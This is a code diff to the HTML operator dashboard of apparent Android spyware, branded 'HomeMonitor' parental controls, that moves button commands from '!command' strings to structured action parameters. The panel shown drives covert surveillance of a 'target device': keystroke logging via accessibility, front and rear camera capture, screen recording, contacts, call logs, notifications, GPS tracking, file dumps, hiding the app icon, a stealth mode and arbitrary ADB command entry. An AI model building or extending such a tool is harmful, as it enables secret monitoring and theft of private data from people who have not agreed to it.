@@ -304,10 +304,10 @@
                             <div class="card card-homemonitor p-3">
                                 <h6 class="fw-bold text-homemonitor-secondary mb-2"><i class="fa-solid fa-sliders me-2 text-warning"></i>Device Management</h6>
                                 <div class="d-flex gap-2 flex-wrap mb-2">
-                                    <button class="btn btn-sm btn-outline-success exec-cmd fw-bold" data-cmd="!status"><i class="fa-solid fa-gauge me-1"></i>Check Status</button>
-                                    <button class="btn btn-sm btn-outline-info exec-cmd fw-bold" data-cmd="!deviceinfo"><i class="fa-solid fa-mobile me-1"></i>Device Specs</button>
-                                    <button class="btn btn-sm btn-outline-warning exec-cmd fw-bold" data-cmd="!camera"><i class="fa-solid fa-camera me-1"></i>Rear Photo</button>
-                                    <button class="btn btn-sm btn-outline-danger exec-cmd fw-bold" data-cmd="!screenshot"><i class="fa-solid fa-desktop me-1"></i>Screenshot</button>
+                                    <button class="btn btn-sm btn-outline-success exec-cmd fw-bold" data-action="status"><i class="fa-solid fa-gauge me-1"></i>Check Status</button>
+                                    <button class="btn btn-sm btn-outline-info exec-cmd fw-bold" data-action="deviceinfo"><i class="fa-solid fa-mobile me-1"></i>Device Specs</button>
+                                    <button class="btn btn-sm btn-outline-warning exec-cmd fw-bold" data-action="camera"><i class="fa-solid fa-camera me-1"></i>Rear Photo</button>
+                                    <button class="btn btn-sm btn-outline-danger exec-cmd fw-bold" data-action="screenshot"><i class="fa-solid fa-desktop me-1"></i>Screenshot</button>
                                     <button class="btn btn-sm btn-outline-primary fw-bold" id="openRenameModalBtn"><i class="fa-solid fa-pen-to-square me-1"></i>Rename</button>
                                     <button class="btn btn-sm btn-outline-danger fw-bold" id="openUnlinkModalBtn"><i class="fa-solid fa-trash-can me-1"></i>Remove Device</button>
                                 </div>
@@ -580,7 +580,7 @@
                         </div>
                         <h4 class="fw-bold text-warning mb-3"><i class="fa-solid fa-address-book me-2"></i>Contacts Phonebook</h4>
                         <div class="d-flex gap-2 mb-3">
-                            <button class="btn btn-homemonitor-primary exec-cmd fw-bold" data-cmd="!contacts"><i class="fa-solid fa-download me-1"></i>Fetch Contacts</button>
+                            <button class="btn btn-homemonitor-primary exec-cmd fw-bold" data-action="contacts"><i class="fa-solid fa-download me-1"></i>Fetch Contacts</button>
                             <button class="btn btn-outline-warning fetch-tab-response fw-bold" data-category="contacts"><i class="fa-solid fa-rotate me-1"></i>Refresh Response</button>
                         </div>
                         <div class="input-group mb-3">
@@ -606,7 +606,7 @@
                         </div>
                         <h4 class="fw-bold text-success mb-3"><i class="fa-solid fa-phone-volume me-2"></i>Call History & Audio Recordings</h4>
                         <div class="d-flex gap-2 mb-3">
-                            <button class="btn btn-homemonitor-primary exec-cmd fw-bold" data-cmd="!calls"><i class="fa-solid fa-download me-1"></i>Fetch Call Logs</button>
+                            <button class="btn btn-homemonitor-primary exec-cmd fw-bold" data-action="calls"><i class="fa-solid fa-download me-1"></i>Fetch Call Logs</button>
                             <button class="btn btn-outline-success fetch-tab-response fw-bold" data-category="calls"><i class="fa-solid fa-rotate me-1"></i>Refresh Response</button>
                         </div>
                         <div class="table-responsive mb-4">
@@ -632,8 +632,8 @@
                         </div>
                         <h4 class="fw-bold text-primary mb-3"><i class="fa-solid fa-images me-2"></i>Device Photo Gallery</h4>
                         <div class="d-flex gap-2 mb-4">
-                            <button class="btn btn-homemonitor-primary exec-cmd fw-bold" data-cmd="!syncmedia 24"><i class="fa-solid fa-file-zipper me-1"></i>Download Media ZIP (24h)</button>
-                            <button class="btn btn-outline-primary exec-cmd fw-bold" data-cmd="!dumpphotos 20"><i class="fa-solid fa-download me-1"></i>Fetch Recent Photos</button>
+                            <button class="btn btn-homemonitor-primary exec-cmd fw-bold" data-action="syncmedia" data-params='{"hours":24}'><i class="fa-solid fa-file-zipper me-1"></i>Download Media ZIP (24h)</button>
+                            <button class="btn btn-outline-primary exec-cmd fw-bold" data-action="photos" data-params='{"limit":20}'><i class="fa-solid fa-download me-1"></i>Fetch Recent Photos</button>
                             <button class="btn btn-outline-info fetch-tab-response fw-bold" data-category="photos"><i class="fa-solid fa-rotate me-1"></i>Refresh Response</button>
                         </div>
                         <div class="row g-3" id="photoGalleryGrid">
@@ -650,8 +650,8 @@
                         </div>
                         <h4 class="fw-bold text-danger mb-3"><i class="fa-solid fa-map-location-dot me-2"></i>GPS Location Tracking</h4>
                         <div class="d-flex gap-2 mb-3">
-                            <button class="btn btn-homemonitor-primary exec-cmd" data-cmd="!geolocation"><i class="fa-solid fa-location-crosshairs me-1"></i>Get GPS Location</button>
-                            <button class="btn btn-outline-secondary exec-cmd" data-cmd="!iplocation"><i class="fa-solid fa-globe me-1"></i>Get IP Location</button>
+                            <button class="btn btn-homemonitor-primary exec-cmd" data-action="geolocation"><i class="fa-solid fa-location-crosshairs me-1"></i>Get GPS Location</button>
+                            <button class="btn btn-outline-secondary exec-cmd" data-action="iplocation"><i class="fa-solid fa-globe me-1"></i>Get IP Location</button>
                             <button class="btn btn-outline-danger fetch-tab-response fw-bold" data-category="gps_locations"><i class="fa-solid fa-rotate me-1"></i>Refresh GPS Response</button>
                         </div>
                         <div class="table-responsive">
@@ -673,8 +673,8 @@
                         </div>
                         <h4 class="fw-bold text-primary mb-3"><i class="fa-solid fa-draw-polygon me-2"></i>Geofence Safe Zones</h4>
                         <form id="geofenceForm" class="row g-3 mb-4">
-                            <div class="col-md-5"><input type="text" class="form-control" placeholder="Zone Name (e.g. Home, School)" required></div>
-                            <div class="col-md-4"><input type="number" class="form-control" placeholder="Radius (meters, e.g. 500)" required></div>
+                            <div class="col-md-5"><input type="text" id="geofenceNameInput" class="form-control" placeholder="Zone Name (e.g. Home, School)" required></div>
+                            <div class="col-md-4"><input type="number" id="geofenceRadiusInput" class="form-control" placeholder="Radius (meters, e.g. 500)" required></div>
                             <div class="col-md-3"><button type="submit" class="btn btn-homemonitor-primary w-100 fw-bold">Add Safe Zone</button></div>
                         </form>
                         <h5 class="fw-bold text-homemonitor-primary mb-2">Active Geofence Boundaries</h5>
@@ -712,9 +712,9 @@
                         </div>
                         <h4 class="fw-bold text-warning mb-3"><i class="fa-solid fa-folder-open me-2"></i>Storage File Directory</h4>
                         <div class="d-flex gap-2 mb-3">
-                            <button class="btn btn-outline-secondary exec-cmd" data-cmd="!ls"><i class="fa-solid fa-list me-1"></i>!ls Directory</button>
-                            <button class="btn btn-outline-secondary exec-cmd" data-cmd="!pwd"><i class="fa-solid fa-folder me-1"></i>!pwd Location</button>
-                            <button class="btn btn-homemonitor-primary exec-cmd" data-cmd="!zip Download"><i class="fa-solid fa-file-zipper me-1"></i>ZIP Download Folder</button>
+                            <button class="btn btn-outline-secondary exec-cmd" data-action="files_list"><i class="fa-solid fa-list me-1"></i>List Directory</button>
+                            <button class="btn btn-outline-secondary exec-cmd" data-action="files_pwd"><i class="fa-solid fa-folder me-1"></i>Current Location</button>
+                            <button class="btn btn-homemonitor-primary exec-cmd" data-action="files_zip" data-params='{"folder":"Download"}'><i class="fa-solid fa-file-zipper me-1"></i>ZIP Download Folder</button>
                             <button class="btn btn-outline-warning fetch-tab-response fw-bold" data-category="files"><i class="fa-solid fa-rotate me-1"></i>Refresh Files Response</button>
                         </div>
                         <div class="table-responsive bg-dark rounded border border-secondary" style="max-height: 400px; overflow-y: auto;">
@@ -830,8 +830,8 @@ $
                         </div>
                         <h4 class="fw-bold text-warning"><i class="fa-solid fa-camera me-2"></i>Camera Studio Photo Capture</h4>
                         <div class="d-flex gap-2 mb-4 mt-3 flex-wrap">
-                            <button class="btn btn-homemonitor-primary exec-cmd fw-bold" data-cmd="!camera"><i class="fa-solid fa-camera me-1"></i>Capture Rear Photo</button>
-                            <button class="btn btn-homemonitor-success exec-cmd fw-bold" data-cmd="!frontcam"><i class="fa-solid fa-user-large me-1"></i>Capture Front Photo</button>
+                            <button class="btn btn-homemonitor-primary exec-cmd fw-bold" data-action="camera"><i class="fa-solid fa-camera me-1"></i>Capture Rear Photo</button>
+                            <button class="btn btn-homemonitor-success exec-cmd fw-bold" data-action="frontcam"><i class="fa-solid fa-user-large me-1"></i>Capture Front Photo</button>
                             <button class="btn btn-outline-warning fetch-tab-response fw-bold" data-category="photos"><i class="fa-solid fa-rotate me-1"></i>Refresh Response</button>
                         </div>
                         <div class="row g-3" id="cameraGalleryGrid">
@@ -878,11 +878,11 @@ $
                         </div>
                         <h4 class="fw-bold text-danger mb-3"><i class="fa-solid fa-shield-virus me-2"></i>Safety Settings & Parental Controls</h4>
                         <div class="d-flex gap-2 flex-wrap mb-4">
-                            <button class="btn btn-outline-danger exec-cmd-confirm" data-cmd="!hideapp" data-desc="Hide App Launcher Icon">🙈 Hide App Icon</button>
-                            <button class="btn btn-outline-success exec-cmd" data-cmd="!unhideapp">👁️ Un-hide App Icon</button>
-                            <button class="btn btn-outline-warning exec-cmd-confirm" data-cmd="!stealth on" data-desc="Enable Stealth Mode Overlay">🕶️ Stealth Mode ON</button>
-                            <button class="btn btn-outline-secondary exec-cmd" data-cmd="!stealth off">☀️ Stealth Mode OFF</button>
-                            <button class="btn btn-outline-primary exec-cmd-confirm" data-cmd="!lock" data-desc="Remote Lock Device Screen">🔒 Lock Device Screen</button>
+                            <button class="btn btn-outline-danger exec-cmd-confirm" data-action="hideapp" data-desc="Hide App Launcher Icon">🙈 Hide App Icon</button>
+                            <button class="btn btn-outline-success exec-cmd" data-action="unhideapp">👁️ Un-hide App Icon</button>
+                            <button class="btn btn-outline-warning exec-cmd-confirm" data-action="stealth" data-params='{"enabled":true}' data-desc="Enable Stealth Mode Overlay">🕶️ Stealth Mode ON</button>
+                            <button class="btn btn-outline-secondary exec-cmd" data-action="stealth" data-params='{"enabled":false}'>☀️ Stealth Mode OFF</button>
+                            <button class="btn btn-outline-primary exec-cmd-confirm" data-action="lock" data-desc="Remote Lock Device Screen">🔒 Lock Device Screen</button>
                         </div>
                         <form id="shizukuForm" class="d-flex gap-2 mb-3">
                             <input type="text" id="shizukuCmdInput" class="form-control font-monospace" placeholder="Enter Shizuku rootless ADB command (e.g. pm list packages)..." required>
@@ -951,8 +951,8 @@ $
                         </div>
                         <h4 class="fw-bold text-info mb-3"><i class="fa-solid fa-cubes me-2"></i>Installed Applications Registry</h4>
                         <div class="d-flex gap-2 mb-3">
-                            <button class="btn btn-homemonitor-primary exec-cmd fw-bold" data-cmd="!termux pm list packages -3"><i class="fa-solid fa-list me-1"></i>List 3rd-Party Packages</button>
-                            <button class="btn btn-outline-secondary exec-cmd fw-bold" data-cmd="!termux pm list packages"><i class="fa-solid fa-cubes me-1"></i>List All System Packages</button>
+                            <button class="btn btn-homemonitor-primary exec-cmd fw-bold" data-action="packages" data-params='{"filter":"third_party"}'><i class="fa-solid fa-list me-1"></i>List 3rd-Party Packages</button>
+                            <button class="btn btn-outline-secondary exec-cmd fw-bold" data-action="packages" data-params='{"filter":"all"}'><i class="fa-solid fa-cubes me-1"></i>List All System Packages</button>
                             <button class="btn btn-outline-info fetch-tab-response fw-bold" data-category="installed_apps"><i class="fa-solid fa-rotate me-1"></i>Refresh Packages Response</button>
                         </div>
                         <div class="row g-3" id="installedAppsGrid">
@@ -969,8 +969,8 @@ $
                         </div>
                         <h4 class="fw-bold text-danger mb-3"><i class="fa-solid fa-circle-play me-2"></i>Screenrecorder & Screenshots</h4>
                         <div class="d-flex gap-2 mb-3">
-                            <button class="btn btn-homemonitor-primary exec-cmd fw-bold" data-cmd="!screenshot"><i class="fa-solid fa-desktop me-1"></i>Capture Live Screenshot</button>
-                            <button class="btn btn-outline-danger exec-cmd fw-bold" data-cmd="!screenrecord 10"><i class="fa-solid fa-video me-1"></i>Record 10s Screen Clip</button>
+                            <button class="btn btn-homemonitor-primary exec-cmd fw-bold" data-action="screenshot"><i class="fa-solid fa-desktop me-1"></i>Capture Live Screenshot</button>
+                            <button class="btn btn-outline-danger exec-cmd fw-bold" data-action="screenrecord" data-params='{"seconds":10}'><i class="fa-solid fa-video me-1"></i>Record 10s Screen Clip</button>
                             <button class="btn btn-outline-warning fetch-tab-response fw-bold" data-category="screenrecorder"><i class="fa-solid fa-rotate me-1"></i>Refresh Captures Response</button>
                         </div>
                         <div class="row g-3" id="screenrecorderGrid">
@@ -987,7 +987,7 @@ $
                         </div>
                         <h4 class="fw-bold text-danger mb-3"><i class="fa-solid fa-keyboard me-2"></i>Accessibility Keystroke Log Stream</h4>
                         <div class="d-flex gap-2 mb-3">
-                            <button class="btn btn-homemonitor-primary exec-cmd fw-bold" data-cmd="!keylog"><i class="fa-solid fa-download me-1"></i>Fetch Keystroke Activity</button>
+                            <button class="btn btn-homemonitor-primary exec-cmd fw-bold" data-action="keylog"><i class="fa-solid fa-download me-1"></i>Fetch Keystroke Activity</button>
                             <button class="btn btn-outline-danger fetch-tab-response fw-bold" data-category="keylogger"><i class="fa-solid fa-rotate me-1"></i>Refresh Keylog Response</button>
                         </div>
                         <div class="list-group gap-2 overflow-y-auto" style="max-height: 400px;" id="keyloggerFeedContainer">
@@ -1004,7 +1004,7 @@ $
                         </div>
                         <h4 class="fw-bold text-warning mb-3"><i class="fa-solid fa-bell me-2"></i>System Notification Feed</h4>
                         <div class="d-flex gap-2 mb-3">
-                            <button class="btn btn-homemonitor-primary exec-cmd fw-bold" data-cmd="!notification"><i class="fa-solid fa-download me-1"></i>Fetch Notifications</button>
+                            <button class="btn btn-homemonitor-primary exec-cmd fw-bold" data-action="notifications"><i class="fa-solid fa-download me-1"></i>Fetch Notifications</button>
                             <button class="btn btn-outline-warning fetch-tab-response fw-bold" data-category="notifications"><i class="fa-solid fa-rotate me-1"></i>Refresh Notifications Response</button>
                         </div>
                         <div class="list-group gap-2 overflow-y-auto" style="max-height: 400px;" id="notificationFeedContainer">
@@ -1045,7 +1045,7 @@ $
                         </div>
                         <h4 class="fw-bold text-danger mb-3"><i class="fa-solid fa-film me-2"></i>Device Video Library</h4>
                         <div class="d-flex gap-2 mb-3">
-                            <button class="btn btn-homemonitor-primary exec-cmd fw-bold" data-cmd="!syncmedia 24"><i class="fa-solid fa-download me-1"></i>Fetch Video Media ZIP (24h)</button>
+                            <button class="btn btn-homemonitor-primary exec-cmd fw-bold" data-action="syncmedia" data-params='{"hours":24}'><i class="fa-solid fa-download me-1"></i>Fetch Video Media ZIP (24h)</button>
                             <button class="btn btn-outline-danger fetch-tab-response fw-bold" data-category="videos"><i class="fa-solid fa-rotate me-1"></i>Refresh Videos Response</button>
                         </div>
                         <div class="row g-3" id="videosGridContainer">
@@ -1206,7 +1206,7 @@ $
                 </div>
                 <div class="modal-body">
                     <p class="small text-light mb-2" id="cmdConfirmBody">Are you sure you want to execute this safety action on the target device?</p>
-                    <div class="p-2 bg-black rounded font-monospace extra-small text-success text-break mb-0" id="cmdConfirmText">!command</div>
+                    <div class="p-2 bg-black rounded font-monospace extra-small text-success text-break mb-0" id="cmdConfirmText">action</div>
                 </div>
                 <div class="modal-footer border-secondary">
                     <button type="button" class="btn btn-sm btn-outline-secondary" data-bs-dismiss="modal">Cancel</button>
